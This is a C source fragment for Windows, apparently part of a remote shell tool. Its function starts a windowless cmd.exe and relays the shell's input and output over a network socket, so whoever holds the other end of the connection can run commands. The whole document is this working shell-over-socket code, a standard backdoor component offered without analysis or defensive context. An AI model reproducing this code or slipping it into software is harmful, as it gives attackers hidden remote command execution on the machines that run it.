/**F*****************************************************************/
void cmd (SOCKET s)
{
    SECURITY_ATTRIBUTES sa;
    PROCESS_INFORMATION pi;
    STARTUPINFO         si;
    OVERLAPPED          lap;

    HANDLE              lh[4];
    DWORD               p, e, wr;
    BYTE                buf[BUFSIZ];
    int                 len;
    HANDLE              evt[MAXIMUM_WAIT_OBJECTS];
    DWORD               evt_cnt=0, sck_evt=0;
    DWORD               stdout_evt=0, proc_evt=0;

    // create event for socket
    evt[sck_evt = evt_cnt++] = WSACreateEvent();

    // initialize security descriptor
    sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle       = TRUE;

    // create anonymous read/write pipes for stdin of cmd.exe
    if (CreatePipe (&lh[0], &lh[1], &sa, 0))
    {
        // format named pipe using tick count and current process id
        wnsprintf ((char*)buf, BUFSIZ, "\\\\.\\pipe\\%08X",
                   GetCurrentProcessId() ^ GetTickCount());

        // create named pipe for stdout/stderr of cmd.exe
        lh[2] = CreateNamedPipe ((char*)buf,
                                 PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                                 PIPE_TYPE_BYTE     | PIPE_READMODE_BYTE | PIPE_WAIT,
                                 PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);

        if (lh[2] != INVALID_HANDLE_VALUE)
        {
            // open the pipe
            lh[3] = CreateFile ((char*)buf, MAXIMUM_ALLOWED,
                                0, &sa, OPEN_EXISTING, 0, NULL);

            if (lh[3] != INVALID_HANDLE_VALUE)
            {
                // create event for stdout handle of cmd.exe
                // initially in a signalled state
                evt[evt_cnt]=CreateEvent (NULL, TRUE, TRUE, NULL);
                stdout_evt = evt_cnt++;

                // zero initialize parameters for CreateProcess
                ZeroMemory (&si, sizeof (si));
                ZeroMemory (&pi, sizeof (pi));

                si.cb              = sizeof (si);
                si.hStdInput       = lh[0];  // assign the anon read pipe
                si.hStdError       = lh[3];  // assign the named write pipe
                si.hStdOutput      = lh[3];  //
                si.dwFlags         = STARTF_USESTDHANDLES;

                // execute cmd.exe with no window
                if (CreateProcess (NULL, "cmd", NULL, NULL, TRUE,
                                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
                {
                    // monitor state of cmd.exe
                    evt[proc_evt = evt_cnt++] = pi.hProcess;

                    ZeroMemory (&lap, sizeof (lap));
                    // assign stdout event
                    lap.hEvent = evt[stdout_evt];

                    // set pending to 0
                    p=0;

                    for (;;)
                    {
                        // wait for events on cmd.exe and socket
                        e=wait_evt(evt, evt_cnt, sck_evt, s);

                        // cmd.exe ended?
                        if (e==proc_evt) {
                            break;
                        }

                        // wait failed?
                        if (e == -1) {
                            break;
                        }
                        // is this socket event?
                        if (e == sck_evt)
                        {
                            // receive data from socket
                            len=recv (s, (char*)buf, sizeof(buf), 0);
                            if (len<=0) break;

                            // write to stdin of cmd.exe
                            WriteFile (lh[1], buf, len, &wr, 0);
                        } else

                            // output from cmd.exe?
                            if (e == stdout_evt)
                            {
                                // if not in pending read state, read stdin
                                if (p == 0)
                                {
                                    ReadFile (lh[2], buf, sizeof(buf),
                                              (LPDWORD)&len, &lap);
                                    p++;
                                } else {
                                    // get overlapped result
                                    if (!GetOverlappedResult (lh[2], &lap,
                                                              (LPDWORD)&len, FALSE)) {
                                        break;
                                    }
                                }
                                // if we have something
                                if (len != 0)
                                {
                                    // send to remote
                                    len=send (s, (char*)buf, len, 0);
                                    if (len<=0) break;
                                    p--;
                                }
                            }
                    }
                    // end cmd.exe incase it's still running
                    TerminateProcess (pi.hProcess, 0);
                    // close handles and decrease events
                    CloseHandle (pi.hThread);
                    CloseHandle (pi.hProcess);
                    evt_cnt--;
                }
                // close handle to named pipe for stdout
                CloseHandle (lh[3]);
            }
            // close named pipe for stdout
            CloseHandle (lh[2]);
        }
        // close anon pipes for read/write to stdin
        CloseHandle (lh[1]);
        CloseHandle (lh[0]);
    }
    // close stdout event handle
    CloseHandle (evt[stdout_evt]);
    evt_cnt--;
    // close socket event handle
    CloseHandle (evt[sck_evt]);
    evt_cnt--;
}